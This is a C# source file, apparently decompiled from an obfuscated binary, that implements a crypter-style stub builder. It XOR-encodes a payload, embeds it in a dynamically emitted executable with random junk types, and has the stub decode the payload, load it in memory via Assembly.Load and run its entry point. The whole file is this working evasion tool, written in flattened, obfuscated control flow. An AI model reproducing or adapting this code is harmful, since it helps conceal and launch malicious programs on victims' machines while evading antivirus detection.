using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

public static class DynamicIlEmitter
{
	internal static readonly Random random_0 = new Random();

	internal static readonly Type[] type_0 = new Type[10]
	{
		typeof(void),
		typeof(int),
		typeof(uint),
		typeof(long),
		typeof(ulong),
		typeof(short),
		typeof(ushort),
		typeof(float),
		typeof(double),
		typeof(bool)
	};

	internal static void smethod_0(ILGenerator ilgenerator_0, byte[] byte_0)
	{
		byte b = (byte)random_0.Next(1, 256);
		StringBuilder stringBuilder = default(StringBuilder);
		int num4 = default(int);
		LocalBuilder localBuilder_2 = default(LocalBuilder);
		LocalBuilder localBuilder_3 = default(LocalBuilder);
		LocalBuilder local = default(LocalBuilder);
		Label label2 = default(Label);
		LocalBuilder localBuilder_ = default(LocalBuilder);
		Label label = default(Label);
		string str = default(string);
		int num3 = default(int);
		while (true)
		{
			int num = 12825994;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ 0x2F49056)) % 45)
				{
				case 44u:
					stringBuilder = new StringBuilder(byte_0.Length);
					num4 = 0;
					num = (int)((num2 * 108601941) ^ 0x8AEEDCA);
					continue;
				case 43u:
					localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
					localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(byte[]));
					num = 657439388;
					continue;
				case 42u:
					local = ilgenerator_0.DeclareLocal(typeof(object[]));
					num = (int)((num2 * 1320485824) ^ 0xAFC787C);
					continue;
				case 41u:
					ilgenerator_0.Emit(OpCodes.Ldc_I4_S, b);
					num = ((int)num2 * -1758726288) ^ 0x4F2AE931;
					continue;
				case 40u:
					ilgenerator_0.Emit(OpCodes.Blt_S, label2);
					ilgenerator_0.smethod_1(localBuilder_3);
					ilgenerator_0.Emit(OpCodes.Call, method_1(typeof(Assembly), "Load", new Type[1] { typeof(byte[]) }));
					num = (int)((num2 * 260118331) ^ 0x149C39D7);
					continue;
				case 39u:
					ilgenerator_0.Emit(OpCodes.Xor);
					ilgenerator_0.Emit(OpCodes.Conv_U1);
					num = (int)(num2 * 1771177155) ^ -34596981;
					continue;
				case 38u:
					ilgenerator_0.smethod_1(localBuilder_);
					ilgenerator_0.smethod_1(localBuilder_2);
					num = ((int)num2 * -480983064) ^ 0x584BABA6;
					continue;
				case 37u:
					localBuilder_ = ilgenerator_0.DeclareLocal(typeof(int));
					local = ilgenerator_0.DeclareLocal(typeof(object[]));
					localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
					num = 968996459;
					continue;
				case 36u:
					ilgenerator_0.smethod_1(localBuilder_);
					ilgenerator_0.Emit(OpCodes.Callvirt, method_0(typeof(string), "get_Chars"));
					num = (int)((num2 * 1313657541) ^ 0x2BE1BF3D);
					continue;
				case 35u:
					ilgenerator_0.Emit(OpCodes.Ldloc, local);
					ilgenerator_0.Emit(OpCodes.Callvirt, method_1(typeof(MethodBase), "Invoke", new Type[2]
					{
						typeof(object),
						typeof(object[])
					}));
					ilgenerator_0.Emit(OpCodes.Pop);
					num = ((int)num2 * -1453873113) ^ -1340856405;
					continue;
				case 34u:
					label = ilgenerator_0.DefineLabel();
					num = 889515582;
					continue;
				case 33u:
					ilgenerator_0.Emit(OpCodes.Ldarg_0);
					ilgenerator_0.Emit(OpCodes.Stelem_Ref);
					num = (int)((num2 * 1540070323) ^ 0x614ABFE4);
					continue;
				case 32u:
					num = (int)((num2 * 1026115448) ^ 0x435CECA);
					continue;
				case 31u:
					localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(byte[]));
					num = ((int)num2 * -2039841948) ^ 0x52739E9E;
					continue;
				case 30u:
					label2 = ilgenerator_0.DefineLabel();
					num = (int)((num2 * 2073120396) ^ 0xC96CB64);
					continue;
				case 29u:
					ilgenerator_0.Emit(OpCodes.Stelem_I1);
					num = ((int)num2 * -296279304) ^ 0x3D45CA79;
					continue;
				case 28u:
					stringBuilder.Append((char)(byte_0[num4] ^ b));
					num4++;
					num = 564271511;
					continue;
				case 27u:
					num = ((int)num2 * -1849074015) ^ -1622128633;
					continue;
				case 26u:
					ilgenerator_0.smethod_1(localBuilder_2);
					num = (int)(num2 * 972965044) ^ -1801248430;
					continue;
				case 25u:
					ilgenerator_0.smethod_2(localBuilder_2);
					num = (int)((num2 * 352871309) ^ 0x6C442947);
					continue;
				case 24u:
					localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
					localBuilder_ = ilgenerator_0.DeclareLocal(typeof(int));
					num = ((int)num2 * -1363483588) ^ 0x6ED4B37E;
					continue;
				case 23u:
					ilgenerator_0.Emit(OpCodes.Ldc_I4_0);
					num = ((int)num2 * -1891963387) ^ 0x4E6F0ADB;
					continue;
				case 22u:
					ilgenerator_0.smethod_1(localBuilder_3);
					ilgenerator_0.smethod_1(localBuilder_);
					num = ((int)num2 * -52615976) ^ 0x172F2A7C;
					continue;
				case 21u:
					ilgenerator_0.Emit(OpCodes.Ldstr, str);
					num = (int)((num2 * 214714123) ^ 0x431BB6F2);
					continue;
				case 20u:
					ilgenerator_0.Emit(OpCodes.Callvirt, method_0(typeof(Assembly), "get_EntryPoint"));
					ilgenerator_0.Emit(OpCodes.Ldnull);
					ilgenerator_0.Emit(OpCodes.Ldc_I4_1);
					num = ((int)num2 * -628378115) ^ -1785105557;
					continue;
				case 19u:
					num = ((num3 == 0) ? (-1296326619) : (-326491273)) ^ (int)(num2 * 193936135);
					continue;
				case 17u:
					localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(byte[]));
					num = ((int)num2 * -314521797) ^ -1249708411;
					continue;
				case 16u:
					ilgenerator_0.Emit(OpCodes.Callvirt, method_0(typeof(string), "get_Length"));
					ilgenerator_0.Emit(OpCodes.Newarr, typeof(byte));
					num = (int)((num2 * 1618865506) ^ 0x112A75D1);
					continue;
				case 15u:
					num = ((num3 != 1) ? (-502026177) : (-667227682)) ^ ((int)num2 * -1389907477);
					continue;
				case 14u:
					ilgenerator_0.Emit(OpCodes.Ldc_I4_1);
					num = (int)((num2 * 1489033811) ^ 0x733FE2BE);
					continue;
				case 13u:
					ilgenerator_0.smethod_1(localBuilder_2);
					num = ((int)num2 * -2128976736) ^ -1616035068;
					continue;
				case 12u:
					ilgenerator_0.Emit(OpCodes.Newarr, typeof(object));
					ilgenerator_0.Emit(OpCodes.Stloc, local);
					ilgenerator_0.Emit(OpCodes.Ldloc, local);
					num = (int)((num2 * 971735712) ^ 0x6D43F1BE);
					continue;
				case 11u:
					ilgenerator_0.smethod_2(localBuilder_);
					ilgenerator_0.MarkLabel(label);
					num = (int)((num2 * 1369625518) ^ 0x2D87D373);
					continue;
				case 9u:
					local = ilgenerator_0.DeclareLocal(typeof(object[]));
					num = 1264608582;
					continue;
				case 8u:
					ilgenerator_0.Emit(OpCodes.Br_S, label);
					ilgenerator_0.MarkLabel(label2);
					num = ((int)num2 * -1799320126) ^ -126316275;
					continue;
				case 7u:
					num = (int)((num2 * 271334085) ^ 0x30388918);
					continue;
				case 6u:
					ilgenerator_0.smethod_2(localBuilder_3);
					ilgenerator_0.Emit(OpCodes.Ldc_I4_0);
					ilgenerator_0.smethod_2(localBuilder_);
					num = ((int)num2 * -1604502922) ^ -1456859302;
					continue;
				case 5u:
					localBuilder_ = ilgenerator_0.DeclareLocal(typeof(int));
					num = ((int)num2 * -487663471) ^ 0x79252920;
					continue;
				case 4u:
					ilgenerator_0.Emit(OpCodes.Callvirt, method_0(typeof(string), "get_Length"));
					num = (int)(num2 * 1644388550) ^ -336213653;
					continue;
				case 3u:
					ilgenerator_0.Emit(OpCodes.Add);
					num = ((int)num2 * -508239057) ^ -946983559;
					continue;
				case 2u:
					ilgenerator_0.smethod_1(localBuilder_);
					num = (int)((num2 * 820501949) ^ 0x1FB6C4D4);
					continue;
				case 1u:
					num = ((num4 < byte_0.Length) ? 2071486505 : 1642015953);
					continue;
				case 0u:
					str = stringBuilder.ToString();
					num3 = random_0.Next(3);
					num = (int)((num2 * 1030772802) ^ 0x38ACFA48);
					continue;
				case 10u:
					break;
				default:
					ilgenerator_0.Emit(OpCodes.Ret);
					return;
				}
				break;
			}
		}
	}

	internal static void smethod_1(this ILGenerator ilgenerator_0, LocalBuilder localBuilder_0)
	{
		if (localBuilder_0.LocalIndex == 0)
		{
			goto IL_0093;
		}
		goto IL_0122;
		IL_0093:
		int num = 859101067;
		goto IL_00cd;
		IL_00cd:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)(num ^ 0x49D682DE)) % 13)
			{
			case 12u:
				ilgenerator_0.Emit(OpCodes.Ldloc_0);
				num = ((int)num2 * -1523914887) ^ 0x3481DFA4;
				continue;
			case 9u:
				ilgenerator_0.Emit(OpCodes.Ldloc_3);
				num = ((int)num2 * -1178763403) ^ 0x4BA34694;
				continue;
			case 8u:
				break;
			case 4u:
				ilgenerator_0.Emit(OpCodes.Ldloc_2);
				num = ((int)num2 * -1453643623) ^ 0xC86B21F;
				continue;
			case 3u:
				goto end_IL_00cd;
			case 1u:
				ilgenerator_0.Emit(OpCodes.Ldloc, localBuilder_0);
				num = 398576207;
				continue;
			case 0u:
				goto IL_00ad;
			default:
				return;
			case 2u:
				goto IL_0122;
			case 5u:
				ilgenerator_0.Emit(OpCodes.Ldloc_1);
				return;
			case 6u:
				return;
			case 7u:
				return;
			case 10u:
				return;
			case 11u:
				return;
			}
			num = ((localBuilder_0.LocalIndex == 2) ? 449455723 : 327609336);
			continue;
			IL_00ad:
			num = ((localBuilder_0.LocalIndex != 3) ? 1041031066 : 1789880780);
			continue;
			end_IL_00cd:
			break;
		}
		goto IL_0093;
		IL_0122:
		num = ((localBuilder_0.LocalIndex == 1) ? 1616290302 : 2142120133);
		goto IL_00cd;
	}

	internal static void smethod_2(this ILGenerator ilgenerator_0, LocalBuilder localBuilder_0)
	{
		if (localBuilder_0.LocalIndex == 0)
		{
			goto IL_0033;
		}
		goto IL_0143;
		IL_0033:
		int num = -1938115738;
		goto IL_00ea;
		IL_00ea:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)(num ^ -473361677)) % 14)
			{
			case 13u:
				ilgenerator_0.Emit(OpCodes.Stloc, localBuilder_0);
				num = -2059354248;
				continue;
			case 12u:
				break;
			case 9u:
				ilgenerator_0.Emit(OpCodes.Stloc_0);
				num = ((int)num2 * -2139582503) ^ -1820880046;
				continue;
			case 8u:
				ilgenerator_0.Emit(OpCodes.Stloc_2);
				num = (int)((num2 * 1459890431) ^ 0x395241F2);
				continue;
			case 5u:
				goto IL_0074;
			case 2u:
				ilgenerator_0.Emit(OpCodes.Stloc_1);
				num = ((int)num2 * -407741664) ^ 0x6D199F37;
				continue;
			case 1u:
				ilgenerator_0.Emit(OpCodes.Stloc_3);
				num = (int)((num2 * 82007744) ^ 0x78398D1B);
				continue;
			case 0u:
				goto IL_00ca;
			default:
				return;
			case 7u:
				goto IL_0143;
			case 3u:
				return;
			case 4u:
				return;
			case 6u:
				return;
			case 10u:
				return;
			case 11u:
				return;
			}
			break;
			IL_00ca:
			num = ((localBuilder_0.LocalIndex != 2) ? (-1185797146) : (-1276922383));
			continue;
			IL_0074:
			num = ((localBuilder_0.LocalIndex == 3) ? (-1109401586) : (-578414888));
		}
		goto IL_0033;
		IL_0143:
		num = ((localBuilder_0.LocalIndex == 1) ? (-1596905633) : (-331981041));
		goto IL_00ea;
	}

	public static void smethod_3(byte[] byte_0, string string_0, PEFileKinds pefileKinds_0)
	{
		AssemblyName assemblyName = new AssemblyName(RecoveredRuntime.smethod_426());
		MethodBuilder methodBuilder = default(MethodBuilder);
		TypeBuilder typeBuilder = default(TypeBuilder);
		ModuleBuilder moduleBuilder_ = default(ModuleBuilder);
		int num4 = default(int);
		AssemblyBuilder assemblyBuilder = default(AssemblyBuilder);
		int num3 = default(int);
		int num5 = default(int);
		while (true)
		{
			int num = -2073128078;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ -114191713)) % 15)
				{
				case 14u:
					methodBuilder = typeBuilder.DefineMethod(RecoveredRuntime.smethod_426(), MethodAttributes.Public | MethodAttributes.Static, typeof(void), new Type[1] { typeof(string[]) });
					num = ((int)num2 * -2024129385) ^ -896303510;
					continue;
				case 13u:
					typeBuilder = RecoveredRuntime.smethod_5(moduleBuilder_);
					num = -1238872512;
					continue;
				case 12u:
					num4 = random_0.Next(5, 30);
					num = ((int)num2 * -1985160637) ^ 0x2EFF1BAD;
					continue;
				case 11u:
					assemblyBuilder.Save(assemblyName.Name + ".exe");
					num = (int)((num2 * 121472233) ^ 0x11984D8B);
					continue;
				case 9u:
					methodBuilder = null;
					num3 = 0;
					num = ((int)num2 * -31959614) ^ -4543026;
					continue;
				case 8u:
					assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Save);
					moduleBuilder_ = assemblyBuilder.DefineDynamicModule(assemblyName.Name, assemblyName.Name + ".exe");
					num = (int)(num2 * 752845250) ^ -1900708857;
					continue;
				case 7u:
					num = ((num5 != num3) ? 813512902 : 616265467) ^ ((int)num2 * -2088486494);
					continue;
				case 5u:
					num5 = random_0.Next(num4);
					num = ((int)num2 * -485642617) ^ 0x143C2F59;
					continue;
				case 4u:
					assemblyBuilder.SetEntryPoint(methodBuilder, pefileKinds_0);
					num = (int)((num2 * 1006761686) ^ 0x7DFA997C);
					continue;
				case 3u:
					smethod_0(methodBuilder.GetILGenerator(), byte_0);
					num = ((int)num2 * -1995184935) ^ -958910331;
					continue;
				case 2u:
					typeBuilder.CreateType();
					num3++;
					num = -368763878;
					continue;
				case 1u:
					num = ((num3 >= num4) ? (-1885986926) : (-298444825));
					continue;
				case 0u:
					methodBuilder.SetCustomAttribute(new CustomAttributeBuilder(method_2(typeof(STAThreadAttribute), new Type[0]), new object[0]));
					num = ((int)num2 * -1461787974) ^ 0x28B1ED82;
					continue;
				case 10u:
					break;
				default:
					File.Move(assemblyName.Name + ".exe", string_0);
					return;
				}
				break;
			}
		}
	}

	internal static int smethod_4(Random random_1, int int_0, int int_1)
	{
		return random_1.Next(int_0, int_1);
	}

	internal static StringBuilder smethod_5(int int_0)
	{
		return new StringBuilder(int_0);
	}

	internal static StringBuilder smethod_6(StringBuilder stringBuilder_0, char char_0)
	{
		return stringBuilder_0.Append(char_0);
	}

	internal static string smethod_7(object object_0)
	{
		return object_0.ToString();
	}

	internal static int smethod_8(Random random_1, int int_0)
	{
		return random_1.Next(int_0);
	}

	internal static Type smethod_9(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static LocalBuilder smethod_10(ILGenerator ilgenerator_0, Type type_1)
	{
		return ilgenerator_0.DeclareLocal(type_1);
	}

	internal static Label smethod_11(ILGenerator ilgenerator_0)
	{
		return ilgenerator_0.DefineLabel();
	}

	internal static void smethod_12(ILGenerator ilgenerator_0, OpCode opCode_0, string string_0)
	{
		ilgenerator_0.Emit(opCode_0, string_0);
	}

	internal static MethodInfo method_0(Type type, string string_0)
	{
		return type.GetMethod(string_0);
	}

	internal static void smethod_13(ILGenerator ilgenerator_0, OpCode opCode_0, MethodInfo methodInfo_0)
	{
		ilgenerator_0.Emit(opCode_0, methodInfo_0);
	}

	internal static void smethod_14(ILGenerator ilgenerator_0, OpCode opCode_0, Type type_1)
	{
		ilgenerator_0.Emit(opCode_0, type_1);
	}

	internal static void smethod_15(ILGenerator ilgenerator_0, OpCode opCode_0)
	{
		ilgenerator_0.Emit(opCode_0);
	}

	internal static void smethod_16(ILGenerator ilgenerator_0, OpCode opCode_0, Label label_0)
	{
		ilgenerator_0.Emit(opCode_0, label_0);
	}

	internal static void smethod_17(ILGenerator ilgenerator_0, Label label_0)
	{
		ilgenerator_0.MarkLabel(label_0);
	}

	internal static void smethod_18(ILGenerator ilgenerator_0, OpCode opCode_0, byte byte_0)
	{
		ilgenerator_0.Emit(opCode_0, byte_0);
	}

	internal static MethodInfo method_1(Type type, string string_0, Type[] type_1)
	{
		return type.GetMethod(string_0, type_1);
	}

	internal static void smethod_19(ILGenerator ilgenerator_0, OpCode opCode_0, LocalBuilder localBuilder_0)
	{
		ilgenerator_0.Emit(opCode_0, localBuilder_0);
	}

	internal static int smethod_20(LocalVariableInfo localVariableInfo_0)
	{
		return localVariableInfo_0.LocalIndex;
	}

	internal static AssemblyName smethod_21(string string_0)
	{
		return new AssemblyName(string_0);
	}

	internal static AppDomain smethod_22()
	{
		return AppDomain.CurrentDomain;
	}

	internal static AssemblyBuilder smethod_23(AppDomain appDomain_0, AssemblyName assemblyName_0, AssemblyBuilderAccess assemblyBuilderAccess_0)
	{
		return appDomain_0.DefineDynamicAssembly(assemblyName_0, assemblyBuilderAccess_0);
	}

	internal static string smethod_24(AssemblyName assemblyName_0)
	{
		return assemblyName_0.Name;
	}

	internal static string smethod_25(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	internal static ModuleBuilder smethod_26(AssemblyBuilder assemblyBuilder_0, string string_0, string string_1)
	{
		return assemblyBuilder_0.DefineDynamicModule(string_0, string_1);
	}

	internal static MethodBuilder smethod_27(TypeBuilder typeBuilder_0, string string_0, MethodAttributes methodAttributes_0, Type type_1, Type[] type_2)
	{
		return typeBuilder_0.DefineMethod(string_0, methodAttributes_0, type_1, type_2);
	}

	internal static ILGenerator smethod_28(MethodBuilder methodBuilder_0)
	{
		return methodBuilder_0.GetILGenerator();
	}

	internal static ConstructorInfo method_2(Type type, Type[] type_1)
	{
		return type.GetConstructor(type_1);
	}

	internal static CustomAttributeBuilder smethod_29(ConstructorInfo constructorInfo_0, object[] object_0)
	{
		return new CustomAttributeBuilder(constructorInfo_0, object_0);
	}

	internal static void smethod_30(MethodBuilder methodBuilder_0, CustomAttributeBuilder customAttributeBuilder_0)
	{
		methodBuilder_0.SetCustomAttribute(customAttributeBuilder_0);
	}

	internal static Type smethod_31(TypeBuilder typeBuilder_0)
	{
		return typeBuilder_0.CreateType();
	}

	internal static void smethod_32(AssemblyBuilder assemblyBuilder_0, MethodInfo methodInfo_0, PEFileKinds pefileKinds_0)
	{
		assemblyBuilder_0.SetEntryPoint(methodInfo_0, pefileKinds_0);
	}

	internal static void smethod_33(AssemblyBuilder assemblyBuilder_0, string string_0)
	{
		assemblyBuilder_0.Save(string_0);
	}

	internal static void smethod_34(string string_0, string string_1)
	{
		File.Move(string_0, string_1);
	}

	internal static Random smethod_35()
	{
		return new Random();
	}
}
